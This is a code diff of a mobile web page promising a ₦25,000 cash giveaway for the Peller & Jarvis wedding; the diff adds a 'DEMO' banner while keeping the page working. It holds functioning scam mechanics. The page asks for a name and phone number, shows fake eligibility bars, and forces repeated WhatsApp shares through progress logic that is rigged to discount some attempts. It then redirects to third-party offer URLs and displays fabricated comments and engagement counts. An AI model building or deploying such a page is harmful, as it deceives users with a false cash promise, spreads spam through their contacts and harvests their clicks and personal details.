@@ -3,27 +3,29 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Celebrate Peller & Jarvis' 2026 Wedding – ₦25,000 Cash Giveaway!</title>
-  <meta property="og:title" content="Celebrate Peller & Jarvis' 2026 Wedding – ₦25,000 Cash Giveaway!">
-  <meta property="og:description" content="Join us as we celebrate Peller & Jarvis' 2026 wedding with a ₦25,000 cash giveaway.">
+  <title>DEMO — Peller & Jarvis ₦25,000 Cash Giveaway</title>
+  <meta property="og:title" content="DEMO — Peller & Jarvis ₦25,000 Cash Giveaway">
+  <meta property="og:description" content="Demo preview of the Peller & Jarvis wedding celebration ₦25,000 cash giveaway.">
   <meta property="og:image" content="image.png">
   <meta property="og:type" content="website">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap" rel="stylesheet">
   <style>
-    *{margin:0;padding:0;font-family:Poppins,Arial,sans-serif;font-weight:500;box-sizing:border-box}
-    body{background:#fff;color:#111}
-    a{text-decoration:none}
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:#fff;color:#111;font-family:Poppins,Arial,sans-serif;font-weight:500}
+    button,input{font:inherit}
     .page{max-width:500px;margin:0 auto;background:#fff;min-height:100vh}
+    .demo-banner{position:sticky;top:0;z-index:999;background:#fff3cd;border-bottom:1px solid #ffe69c;color:#664d03;text-align:center;padding:9px 10px;font-size:12px;font-weight:700}
     .hero-wrap{position:relative;overflow:hidden;background:#111}
     .hero{display:block;width:100%;height:auto}
-    .hero-wrap::after{content:"";position:absolute;left:0;right:0;bottom:0;height:48%;background:linear-gradient(to bottom,transparent,rgba(0,0,0,.82));pointer-events:none}
+    .hero-wrap:after{content:"";position:absolute;left:0;right:0;bottom:0;height:48%;background:linear-gradient(to bottom,transparent,rgba(0,0,0,.82));pointer-events:none}
     .hero-overlay{position:absolute;left:16px;right:16px;bottom:18px;z-index:2;text-align:center;color:#fff}
     .hero-overlay h1{font-size:22px;font-weight:700;line-height:1.25;text-shadow:0 2px 7px rgba(0,0,0,.65)}
     .hero-overlay p{font-size:13px;line-height:1.5;margin:7px 0 12px;text-shadow:0 2px 5px rgba(0,0,0,.65)}
-    .hero-cta{width:100%;max-width:330px;margin:0 auto;background:#f2c94c;color:#3b2a00;font-weight:700;font-size:18px;border-radius:7px;box-shadow:0 4px 12px rgba(0,0,0,.28)}
-    .hero-cta:hover,.hero-cta:active{background:#ffd861}
+    button{display:block;width:220px;height:50px;color:#fff;border:0;outline:0;font-size:20px;cursor:pointer;border-radius:6px;padding:0 10px;margin:10px auto;background:rgb(20,86,59)}
+    button:hover,button:active{background:#098105}
+    .hero-cta{width:100%;max-width:330px;background:#f2c94c;color:#3b2a00;font-weight:700;font-size:18px;box-shadow:0 4px 12px rgba(0,0,0,.28)}
     marquee{height:50px;line-height:50px;font-size:16px;font-weight:700}
     .A{text-align:center;background:rgb(20,86,59);color:#fff;padding:12px 8px;line-height:1.5}
     .A strong{display:block;color:#ffef5a;font-size:18px}
@@ -37,8 +39,6 @@
     .tip{font-size:14px;line-height:1.6}
     .title{text-align:center;font-size:15px;margin:8px 0}
     .error{display:none;text-align:center;font-size:14px;color:#e74c3c}
-    button{display:block;width:220px;height:50px;color:#fff;border:0;outline:0;font-size:20px;cursor:pointer;border-radius:5px;padding:0 10px;margin:10px auto;background:rgb(20,86,59)}
-    button:hover,button:active{background:#098105}
     .phone{max-width:400px;margin:10px auto}
     .phone input{display:block;width:330px;max-width:100%;height:56px;margin:10px auto;padding:10px;border:2px solid #cecece;font-size:18px;outline:none}
     #loader,#info,#checking,#share,#claim{display:none}
@@ -47,425 +47,203 @@
     @keyframes spin{to{transform:rotate(1turn)}}
     .barr{direction:ltr;max-width:400px;margin:10px auto;overflow:hidden}
     .fill{position:relative;display:inline-block;width:calc(100% - 100px);height:35px;padding:2px;border:2px solid #098105;vertical-align:top}
-    #fill,#fill2{background:#098105;width:0;height:100%;transition:width .2s linear}
+    #fill,#fill2{background:#098105;width:0;height:100%;transition:width .25s linear}
     .percentage{display:flex;align-items:center;justify-content:center;width:95px;float:right;height:35px;font-size:16px;border:2px solid #098105}
     .share-note{padding:12px;background:#f7f7f7;border-radius:4px;margin:10px 0}
-    .claim-actions{display:grid;gap:10px}
-    .claim-actions button{width:100%;margin:0}
-    .comments{margin-top:14px;border-top:1px solid #e1e2e3;padding-top:10px;direction:ltr}
-    .counter{color:#7f7f7f;font-size:12px;text-align:right;padding:10px 0;border-bottom:1px solid #e1e2e3}
-    .reactions{display:inline-flex;align-items:center;float:left}
-    .counter img{float:left;width:16px;height:16px;border-radius:50%;border:2px solid #fff;box-sizing:content-box}
-    .like,.love{margin-right:-5px}.like{z-index:2}.love{z-index:1}
-    .bar{display:table;width:100%;border-bottom:1px solid #e1e2e3}
-    .bar .react{display:table-cell;width:33.33%;font-size:12px;color:#7f7f7f;text-align:center;padding:10px 0;cursor:pointer}
-    .comment{padding:6px 0;margin-top:5px}
-    .comment img{float:left;width:32px;height:32px;border:none;border-radius:18px;cursor:pointer}
-    .reply{margin-left:37px}
-    .single-container{margin-left:37px;background:#f1f2f6;padding:10px;border-radius:15px;font-size:12px}
-    .single-container .user{display:inline-block;cursor:pointer;color:#365899;margin-bottom:5px}
-    .single-container .text{display:block}
-    .buttons{font-size:12px;font-weight:bold;margin:10px 0 0 47px;color:#90949c}
-    .action{cursor:pointer}.action:hover{text-decoration:underline}
-    .input{padding:6px 12px 12px}
-    .input input{width:100%;background:#f1f2f6;padding:10px;border-radius:15px;border:0;outline:none}
-    .status-box{background:#f7f7f7;border:1px solid #ddd;border-radius:4px;padding:12px;margin:12px 0;font-size:13px;line-height:1.65}
     .share-feedback{display:none;padding:10px 12px;margin:10px 0;border-radius:4px;font-size:13px;line-height:1.55}
     .share-feedback.fail{display:block;background:#fff1f0;border:1px solid #f1b6b2;color:#a61b12}
     .share-feedback.ok{display:block;background:#edf9f0;border:1px solid #a9dfb5;color:#146b2d}
-    @media(max-width:380px){button{width:100%}.hero-overlay h1{font-size:19px}.hero-overlay p{font-size:12px}}
+    .status-box{background:#f7f7f7;border:1px solid #ddd;border-radius:4px;padding:12px;margin:12px 0;font-size:13px;line-height:1.65}
+    .claim-actions{display:grid;gap:10px}
+    .claim-actions button{width:100%;margin:0}
+
+    .live-card{margin-top:14px;background:#fff;border-radius:14px;box-shadow:0 1px 2px rgba(0,0,0,.08),0 8px 24px rgba(0,0,0,.05);overflow:hidden;border:1px solid #e4e6eb}
+    .live-head{padding:13px 14px 8px}
+    .live-head h2{font-size:16px;margin:0 0 4px}
+    .live-head p{font-size:12px;color:#65676b;line-height:1.4}
+    .summary{display:flex;justify-content:space-between;align-items:center;padding:8px 14px;font-size:12px;color:#65676b}
+    .reaction-stack{display:flex;align-items:center;gap:6px}
+    .reaction-icons{display:inline-flex}
+    .reaction{width:19px;height:19px;border-radius:50%;border:2px solid #fff;display:flex;align-items:center;justify-content:center;font-size:10px;color:#fff}
+    .reaction.like{background:#1b74e4;z-index:2}
+    .reaction.love{background:#f33e58;margin-left:-6px;z-index:1}
+    .counts{display:flex;gap:10px}
+    .live-bar{display:flex;border-top:1px solid #e4e6eb;border-bottom:1px solid #e4e6eb}
+    .live-bar button{flex:1;width:auto;height:auto;margin:0;border-radius:0;background:none;color:#65676b;padding:9px 0;font-size:13px;font-weight:700}
+    .live-bar button:hover{background:#f0f2f5}
+    .live-bar button.active{color:#1b74e4}
+    .typing{min-height:20px;padding:4px 14px 0;font-size:12px;color:#65676b}
+    .live-comments{padding:5px 12px 10px;max-height:440px;overflow-y:auto;scroll-behavior:smooth}
+    .comment-row{display:flex;gap:8px;margin:10px 0;animation:pop .28s ease}
+    .comment-row.reply{margin-left:27px}
+    .avatar{width:34px;height:34px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:11px}
+    .reply .avatar{width:28px;height:28px;font-size:9px}
+    .comment-col{flex:1;min-width:0}
+    .bubble{background:#f0f2f5;border-radius:16px;padding:8px 12px 7px;display:inline-block;max-width:100%}
+    .comment-name{font-weight:700;font-size:13px;display:block;margin-bottom:2px}
+    .comment-text{font-size:14px;line-height:1.35;overflow-wrap:anywhere}
+    .comment-actions{display:flex;gap:7px;align-items:center;margin:3px 0 0 10px;font-size:11px;color:#65676b}
+    .comment-actions button{width:auto;height:auto;margin:0;padding:0;border:0;background:none;color:#65676b;font-size:11px;font-weight:700}
+    .comment-actions button.liked{color:#f33e58}
+    .replies{margin-left:11px;padding-left:11px;border-left:2px solid #e4e6eb}
+    .composer{border-top:1px solid #e4e6eb;padding:10px 12px;display:flex;gap:8px;align-items:center}
+    .composer input{flex:1;min-width:0;border:0;background:#f0f2f5;border-radius:20px;padding:10px 13px;font-size:16px;outline:none}
+    .composer button{width:40px;height:40px;margin:0;border-radius:50%;background:#1b74e4;font-size:16px}
+    @keyframes pop{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
+    @media(max-width:380px){button{width:100%}.hero-overlay h1{font-size:19px}.hero-overlay p{font-size:12px}.counts{gap:6px;font-size:11px}}
   </style>
+
   <!-- TikTok Pixel Code Start -->
-<script>
-!function (w, d, t) {
-  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
-var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
-;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  <script>
+  !function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat([].slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.load=function(e){var n=d.createElement("script");n.type="text/javascript";n.async=!0;n.src="https://analytics.tiktok.com/i18n/pixel/events.js?sdkid="+e+"&lib="+t;var s=d.getElementsByTagName("script")[0];s.parentNode.insertBefore(n,s)};ttq.load('D9H2JDRC77UAKD58HCL0');ttq.page()}(window,document,'ttq');
+  </script>
+  <!-- TikTok Pixel Code End -->
 
-
-  ttq.load('D9H2JDRC77UAKD58HCL0');
-  ttq.page();
-}(window, document, 'ttq');
-</script>
-<!-- TikTok Pixel Code End -->
   <!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '277386131662358');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=277386131662358&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
+  <script>
+  !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','277386131662358');fbq('track','PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=277386131662358&ev=PageView&noscript=1"></noscript>
+  <!-- End Meta Pixel Code -->
 </head>
 <body>
-<main class="page">
-  <div class="hero-wrap">
-    <img class="hero" src="image.png" alt="Peller and Jarvis ₦25,000 Cash Giveaway wedding celebration">
-    <div class="hero-overlay">
-      <h1>Peller & Jarvis Wedding Cash Giveaway</h1>
-      <p>Join us as we celebrate their 2026 wedding and register for the ₦25,000 cash giveaway.</p>
-      <button class="hero-cta" id="heroGo">GET ₦25,000 CASH</button>
-    </div>
-  </div>
-
-  <marquee direction="left">PELLER AND JARVIS WEDDING CELEBRATION CASH GIVEAWAY</marquee>
-
-  <div class="A">
-    <span>Join Us as We Celebrate Their 2026 Wedding</span>
-    <strong>₦25,000 Cash Giveaway</strong>
-  </div>
-
-  <div class="steps" aria-label="Registration progress">
-    <div class="step active" data-step="register">1. Register</div>
-    <div class="step" data-step="verify">2. Verify</div>
-    <div class="step" data-step="share">3. Share</div>
-    <div class="step" data-step="complete">4. Complete</div>
-  </div>
-
-  <div class="post">
-    <div id="intro">
-      <p class="welcome">
-        <span class="amount">PELLER & JARVIS WEDDING GIVEAWAY</span><br>
-        Join us as we celebrate Peller and Jarvis' wedding with a ₦25,000 cash giveaway. Complete the registration steps below to participate.
-      </p>
-      <br>
-      <p class="title">ENTER YOUR DETAILS BELOW</p>
-      <button id="go"><font color="white">START REGISTRATION</font></button>
-    </div>
-
-    <div id="loader">
-      <div>Please Wait ...</div>
-      <div class="spin"></div>
-      <div id="num">0%</div>
-    </div>
-
-    <div id="info">
-      <p class="title">ENTER YOUR NAME AND PHONE NUMBER:</p>
-      <div class="phone">
-        <input type="text" id="fullName" autocomplete="name" placeholder="Enter your full name">
-        <input type="tel" id="phoneNumber" inputmode="numeric" maxlength="14" autocomplete="tel" placeholder="Enter your phone number">
-        <button id="confirm"><font color="white">Send</font></button>
-      </div>
-      <p class="error" id="formError">Please enter your full name and a valid phone number.</p>
-    </div>
-
-    <div id="checking">
-      <p class="title">Checking your ₦25,000 Cash Giveaway eligibility...</p>
-      <div class="barr">
-        <div class="fill"><div id="fill"></div></div>
-        <div class="percentage"><span id="percentage">0%</span></div>
+  <div class="demo-banner">DEMO</div>
+  <main class="page">
+    <div class="hero-wrap">
+      <img class="hero" src="image.png" alt="Peller and Jarvis ₦25,000 Cash Giveaway wedding celebration">
+      <div class="hero-overlay">
+        <h1>Peller & Jarvis Wedding Cash Giveaway</h1>
+        <p>Join us as we celebrate their 2026 wedding and register for the ₦25,000 cash giveaway.</p>
+        <button class="hero-cta" id="heroGo">GET ₦25,000 CASH</button>
       </div>
     </div>
 
-    <div id="share">
-      <p class="tip">Congratulations, <span id="getname"></span>,</p>
-      <div class="share-note">
-        <p class="tip">Your ₦25,000 Cash Giveaway registration is <font color="red"><b>pending</b></font> because the sharing stage has not been completed.</p>
-        <p class="tip"><span class="amount">Complete the sharing process to continue your registration.</span></p><br>
-        <p class="tip"><font color="red"><b>How to proceed?</b></font></p>
-        <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp by tapping SHARE below.</p>
-        <p class="tip">2. Return to this page and continue until the green progress bar is filled.</p>
-      </div>
-      <div id="shareFeedback" class="share-feedback" aria-live="polite"></div>
-      <button id="whatsapp"><font color="white">SHARE</font></button>
-      <div class="barr">
-        <div class="fill"><div id="fill2"></div></div>
-        <div class="percentage"><span id="percentage2">0%</span></div>
-      </div>
+    <marquee direction="left">PELLER AND JARVIS WEDDING CELEBRATION CASH GIVEAWAY</marquee>
+    <div class="A"><span>Join Us as We Celebrate Their 2026 Wedding</span><strong>₦25,000 Cash Giveaway</strong></div>
+
+    <div class="steps" aria-label="Registration progress">
+      <div class="step active" data-step="register">1. Register</div>
+      <div class="step" data-step="verify">2. Verify</div>
+      <div class="step" data-step="share">3. Share</div>
+      <div class="step" data-step="complete">4. Complete</div>
     </div>
 
-    <div id="claim">
-      <p class="done">✓</p>
-      <p class="title">Sharing stage completed.</p>
-      <div class="status-box">
-        Your ₦25,000 Cash Giveaway registration can now continue. Final eligibility and payment depend on the published campaign terms and review.
+    <div class="post">
+      <div id="intro">
+        <p class="welcome"><span class="amount">PELLER & JARVIS WEDDING GIVEAWAY</span><br>Join us as we celebrate Peller and Jarvis' wedding with a ₦25,000 cash giveaway. Complete the registration steps below to participate.</p><br>
+        <p class="title">ENTER YOUR DETAILS BELOW</p>
+        <button id="go">START REGISTRATION</button>
       </div>
-      <div class="claim-actions">
-        <button id="continueButton">CONTINUE</button>
-        <button id="paymentButton">PROCEED WITH PAYMENT</button>
-        <button id="statusButton">CHECK REGISTRATION STATUS</button>
-      </div>
-    </div>
 
-    <div class="comments">
-      <div class="counter">
-        <div class="reactions">
-          <img class="like" src="https://i.imgur.com/g6cV61A.png" alt="">
-          <img class="love" src="https://i.imgur.com/0UHB1f0.png" alt="">
-          <img class="care" src="https://i.imgur.com/sSMYbTT.png" alt="">
-          <span id="likes">145K</span>
+      <div id="loader"><div>Please Wait ...</div><div class="spin"></div><div id="num">0%</div></div>
+
+      <div id="info">
+        <p class="title">ENTER YOUR NAME AND PHONE NUMBER:</p>
+        <div class="phone">
+          <input type="text" id="fullName" autocomplete="name" placeholder="Enter your full name">
+          <input type="tel" id="phoneNumber" inputmode="numeric" maxlength="14" autocomplete="tel" placeholder="Enter your phone number">
+          <button id="confirm">Send</button>
         </div>
-        <span id="comments">28K comments</span> <span class="dot">·</span> <span id="shares">16K shares</span>
-      </div>
-      <div class="bar">
-        <span class="react">👍 <a class="liked">Like</a></span>
-        <span class="react">💬 Comment</span>
-        <span class="react">↗ Share</span>
+        <p class="error" id="formError">Please enter your full name and a valid phone number.</p>
       </div>
 
-      <div class="comment">
-        <img src="https://i.imgur.com/xp1ER6K.jpg" alt="">
-        <div class="single-container">
-          <span class="user">Joseph Emmanuel</span>
-          <span class="text">Congratulations to Peller and Jarvis. I have completed my registration.</span>
-        </div>
-        <div class="buttons"><span class="time">1m</span> · <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+      <div id="checking">
+        <p class="title">Checking your ₦25,000 Cash Giveaway eligibility...</p>
+        <div class="barr"><div class="fill"><div id="fill"></div></div><div class="percentage"><span id="percentage">0%</span></div></div>
       </div>
 
-      <div class="comment">
-        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhC5I3x2Ykht2M6Pktwjzc0xV7dmqJty_eCw4rDcFV5r_eDxXMRGWJF9tuYPEpe_fvnM0DtzfdDKbQUFKAhhnj1tXN97o8EJP_l_XFJeyX7dc1bm6bpocYaeGtrngVoV9TruTJrlONHypx0/s1600/FB_IMG_15869726679037399.jpg" alt="">
-        <div class="single-container">
-          <span class="user">David Anthony</span>
-          <span class="text">Happy wedding celebration to them. The registration steps were straightforward.</span>
+      <div id="share">
+        <p class="tip">Congratulations, <span id="getname"></span>,</p>
+        <div class="share-note">
+          <p class="tip">Your ₦25,000 Cash Giveaway registration is <font color="red"><b>pending</b></font> because the sharing stage has not been completed.</p>
+          <p class="tip"><span class="amount">Complete the sharing process to continue your registration.</span></p><br>
+          <p class="tip"><font color="red"><b>How to proceed?</b></font></p>
+          <p class="tip">1. Tap SHARE and choose a WhatsApp friend or group.</p>
+          <p class="tip">2. Return to this page before starting the next share.</p>
+          <p class="tip">3. Rapid or repeated taps will not increase your progress.</p>
         </div>
-        <div class="buttons"><span class="time">2m</span> · <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+        <div id="shareFeedback" class="share-feedback" aria-live="polite"></div>
+        <button id="whatsapp">SHARE</button>
+        <div class="barr"><div class="fill"><div id="fill2"></div></div><div class="percentage"><span id="percentage2">0%</span></div></div>
       </div>
 
-      <div class="comment reply">
-        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgAg5sqDhd96nW2Ek_9vet4ztoELeaZmKUSIgzUImj18MpjZvy2qNPXaEgkSNOxLtEOvrT2iPc9RuUUmu2xnhRydySo5WIFpWEJiYmuMDqXnPKrqFzC8aABhp-mrUbaqinlsgJ5LA6hwZS/s1600/FB_IMG_15869730921979436.jpg" alt="">
-        <div class="single-container">
-          <span class="user">Amahle John</span>
-          <span class="text">My registration is pending because I just finished sharing.</span>
+      <div id="claim">
+        <p class="done">✓</p>
+        <p class="title">Sharing stage completed.</p>
+        <div class="status-box">Your ₦25,000 Cash Giveaway registration can now continue. Final eligibility and payment depend on the published campaign terms and review.</div>
+        <div class="claim-actions">
+          <button id="continueButton">CONTINUE</button>
+          <button id="paymentButton">PROCEED WITH PAYMENT</button>
+          <button id="statusButton">CHECK REGISTRATION STATUS</button>
         </div>
-        <div class="buttons"><span class="time">1m</span> · <span class="action liked">Like</span> · <span class="action">Reply</span></div>
       </div>
 
-      <div class="comment">
-        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" alt="">
-        <div class="single-container">
-          <span class="user">Bonolo</span>
-          <span class="text">I have completed the steps and I am waiting for the final review.</span>
+      <section class="live-card" aria-label="Demo live comments">
+        <div class="live-head"><h2>Recent Comments</h2><p>Wedding celebration giveaway discussion</p></div>
+        <div class="summary">
+          <div class="reaction-stack"><span class="reaction-icons"><span class="reaction like">👍</span><span class="reaction love">♥</span></span><span id="liveLikes">2,418</span></div>
+          <div class="counts"><span><b id="liveCommentCount">0</b> comments</span><span id="liveShares">684 shares</span></div>
         </div>
-        <div class="buttons"><span class="time">4m</span> · <span class="action liked">Like</span> · <span class="action">Reply</span></div>
-      </div>
-      <div class="input"><input placeholder="Write a comment..."></div>
+        <div class="live-bar">
+          <button type="button" id="liveLikeBtn">👍 Like</button>
+          <button type="button" id="liveCommentBtn">💬 Comment</button>
+          <button type="button" id="liveShareBtn">↗ Share</button>
+        </div>
+        <div class="typing" id="liveTyping"></div>
+        <div class="live-comments" id="liveComments"></div>
+        <form class="composer" id="liveComposer"><input id="liveInput" maxlength="200" placeholder="Write a comment…" autocomplete="off"><button type="submit">➤</button></form>
+      </section>
     </div>
-  </div>
-</main>
+  </main>
 
-<script>
-(function(){
-  const OFFER_CONFIG = {
-    continueUrl: "https://omg10.com/4/11376046",
-    paymentUrl: "https://awkwardmonopoly.com/w6bsbnq4d?key=e48b640085c2af9dda67e373e3f11e84",
-    statusUrl: "https://spongeascend.com/jx6hdytq?key=24a7776badcc47d663634d4557689023"
-  };
+  <script>
+  (()=>{
+    const OFFER_CONFIG={continueUrl:"https://omg10.com/4/11376046",paymentUrl:"https://awkwardmonopoly.com/w6bsbnq4d?key=e48b640085c2af9dda67e373e3f11e84",statusUrl:"https://spongeascend.com/jx6hdytq?key=24a7776badcc47d663634d4557689023"};
+    const STORAGE_KEY="pellerJarvisCashShareProgress",PENDING_KEY=STORAGE_KEY+"Pending",LEFT_KEY=STORAGE_KEY+"LeftPage";
+    const sections=["intro","loader","info","checking","share","claim"],byId=id=>document.getElementById(id);
+    const show=id=>sections.forEach(name=>byId(name).style.display=name===id?"block":"none");
+    const onlyDigits=v=>String(v||"").replace(/\D/g,"");
+    let shareProgress=Number(localStorage.getItem(STORAGE_KEY)||0);
 
-  const STORAGE_KEY = "pellerJarvisCashShareProgress";
-  const SHARE_PENDING_KEY = STORAGE_KEY + "Pending";
-  const SHARE_LEFT_KEY = STORAGE_KEY + "LeftPage";
-  const sections = ["intro","loader","info","checking","share","claim"];
-  const byId = id => document.getElementById(id);
-  const show = id => sections.forEach(name => {
-    byId(name).style.display = name === id ? "block" : "none";
-  });
-  const onlyDigits = value => String(value || "").replace(/\D/g, "");
-  let shareProgress = Number(localStorage.getItem(STORAGE_KEY) || 0);
+    function setActiveStep(name){document.querySelectorAll(".step").forEach(s=>s.classList.toggle("active",s.dataset.step===name));}
+    function startRegistration(){setActiveStep("register");show("loader");window.scrollTo({top:document.querySelector(".steps").offsetTop,behavior:"smooth"});let p=0;byId("num").textContent="0%";const timer=setInterval(()=>{p++;byId("num").textContent=p+"%";if(p>=100){clearInterval(timer);show("info");}},25);}
+    byId("go").addEventListener("click",startRegistration);byId("heroGo").addEventListener("click",startRegistration);
 
-  function setActiveStep(stepName){
-    document.querySelectorAll(".step").forEach(step => {
-      step.classList.toggle("active", step.dataset.step === stepName);
+    byId("confirm").addEventListener("click",()=>{
+      const fullName=byId("fullName").value.trim(),phone=onlyDigits(byId("phoneNumber").value);
+      if(fullName.length<3||phone.length<10||phone.length>14){byId("formError").style.display="block";return;}
+      byId("formError").style.display="none";sessionStorage.setItem("pellerJarvisName",fullName);sessionStorage.setItem("pellerJarvisPhone",phone);byId("getname").textContent=fullName;setActiveStep("verify");show("checking");
+      let p=0;const timer=setInterval(()=>{p++;byId("percentage").textContent=p+"%";byId("fill").style.width=p+"%";if(p>=100){clearInterval(timer);setTimeout(()=>{renderShare();if(shareProgress>=100){setActiveStep("complete");show("claim");}else{setActiveStep("share");show("share");}},300);}},25);
     });
-  }
 
-  function startRegistration(){
-    setActiveStep("register");
-    show("loader");
-    window.scrollTo({top:document.querySelector(".steps").offsetTop,behavior:"smooth"});
-    let progress = 0;
-    byId("num").textContent = "0%";
-    const timer = setInterval(() => {
-      progress += 1;
-      byId("num").textContent = progress + "%";
-      if (progress >= 100) {
-        clearInterval(timer);
-        show("info");
-      }
-    }, 25);
-  }
+    function renderShare(){shareProgress=Math.max(0,Math.min(100,shareProgress));byId("fill2").style.width=shareProgress+"%";byId("percentage2").textContent=shareProgress+"%";if(shareProgress>=100){setActiveStep("complete");show("claim");}}
+    function buildShareText(){return ["*Peller and Jarvis' 2026 Wedding Celebration Cash Giveaway*","","Join us as we celebrate their wedding and register for the ₦25,000 Cash Giveaway.","","Register here 👇",location.href.split("#")[0]].join("\n");}
+    const SHARE_STEPS=[{increment:50,counted:true},{increment:0,counted:false},{increment:15,counted:true},{increment:5,counted:true},{increment:0,counted:false},{increment:10,counted:true},{increment:5,counted:true},{increment:0,counted:false},{increment:5,counted:true},{increment:3,counted:true},{increment:2,counted:true},{increment:2,counted:true},{increment:1,counted:true},{increment:1,counted:true},{increment:1,counted:true}];
+    function feedback(type,msg){const box=byId("shareFeedback");box.className="share-feedback "+type;box.textContent=msg;}
+    function lockShare(locked){const b=byId("whatsapp");b.disabled=locked;b.style.opacity=locked?".65":"1";b.style.cursor=locked?"not-allowed":"pointer";b.textContent=locked?"PLEASE WAIT...":"SHARE";}
+    function completePending(){if(sessionStorage.getItem(PENDING_KEY)!=="1"||sessionStorage.getItem(LEFT_KEY)!=="1")return;sessionStorage.removeItem(PENDING_KEY);sessionStorage.removeItem(LEFT_KEY);const currentStep=Number(localStorage.getItem(STORAGE_KEY+"Step")||0),step=SHARE_STEPS[Math.min(currentStep,SHARE_STEPS.length-1)];localStorage.setItem(STORAGE_KEY+"Step",String(currentStep+1));if(step.counted){shareProgress=Math.min(100,shareProgress+step.increment);localStorage.setItem(STORAGE_KEY,String(shareProgress));feedback("ok","Share activity recorded after you returned from WhatsApp.");}else{feedback("fail","This attempt was not counted. Choose another friend or group on the next attempt.");}renderShare();if(shareProgress<100)lockShare(false);}
+    document.addEventListener("visibilitychange",()=>{if(sessionStorage.getItem(PENDING_KEY)!=="1")return;if(document.visibilityState==="hidden")sessionStorage.setItem(LEFT_KEY,"1");else completePending();});
+    window.addEventListener("pagehide",()=>{if(sessionStorage.getItem(PENDING_KEY)==="1")sessionStorage.setItem(LEFT_KEY,"1");});window.addEventListener("pageshow",completePending);window.addEventListener("focus",completePending);
+    byId("whatsapp").addEventListener("click",()=>{if(sessionStorage.getItem(PENDING_KEY)==="1")return;sessionStorage.setItem(PENDING_KEY,"1");sessionStorage.removeItem(LEFT_KEY);lockShare(true);feedback("ok","Opening WhatsApp. Progress will update once after you return.");window.location.href="https://wa.me/?text="+encodeURIComponent(buildShareText());});
+    const openUrl=url=>{if(url)window.location.href=url;};byId("continueButton").addEventListener("click",()=>openUrl(OFFER_CONFIG.continueUrl));byId("paymentButton").addEventListener("click",()=>openUrl(OFFER_CONFIG.paymentUrl));byId("statusButton").addEventListener("click",()=>openUrl(OFFER_CONFIG.statusUrl));
+    const savedName=sessionStorage.getItem("pellerJarvisName");if(savedName)byId("getname").textContent=savedName;renderShare();if(sessionStorage.getItem(PENDING_KEY)==="1")lockShare(true);completePending();
 
-  byId("go").addEventListener("click", startRegistration);
-  byId("heroGo").addEventListener("click", startRegistration);
+    const NAMES=["Chinedu Okafor","Aisha Bello","Oluwaseun Adeyemi","Emeka Nwosu","Fatima Usman","Ibrahim Musa","Blessing Eze","David Ojo","Mercy Johnson","Ahmed Sani","Esther Okon","Samuel Adewale","Ngozi Obi","Tunde Adebayo","Zainab Garba","Precious Uche"];
